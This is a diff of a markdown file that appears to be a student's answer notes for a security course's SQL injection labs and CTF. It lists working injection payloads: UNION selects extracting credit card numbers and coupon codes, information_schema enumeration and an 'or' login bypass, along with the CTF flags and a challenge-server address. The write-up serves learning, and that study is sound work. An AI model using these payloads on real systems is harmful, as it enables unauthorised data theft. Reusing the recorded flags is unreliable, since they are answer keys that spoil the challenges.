@@ -27,12 +27,15 @@ Privilege Escalation - *CTF{YOU_GOT_ADMIN_PRIVILEGE}
 ## week 2
 
 ### Lab
-------
-SQL Injection Escaping:   `\'   or 1;--`
-------
-SQL Injection Challenge Three:  `Mary Martin' union select CreditCardNumber from customers where customerName = 'Mary Martin`
-------
-SQL Injection 5: `couponCode=' union select 1, 2, couponCode from vipCoupons limit 1 # `
+
+SQL Injection Escaping 
+`\'   or 1;--`
+
+SQL Injection Challenge Three:  
+`Mary Martin' union select CreditCardNumber from customers where customerName = 'Mary Martin`
+
+SQL Injection 5
+`couponCode=' union select 1, 2, couponCode from vipCoupons limit 1 # `
 
 ### CTF
 
@@ -59,6 +62,7 @@ https://35.188.146.206/public/protected/flags/09/
 
 https://35.188.146.206/public/protected/flags/10/
 `" or 1=1 limit 6,1#         " union select 1,2,3,4,5,schema_name FROM information_schema.schemata limit 1,1# `
+
 `*CTF{sqli_10}`
 
 https://35.188.146.206/public/protected/flags/12/  in both fields: `"or"1`
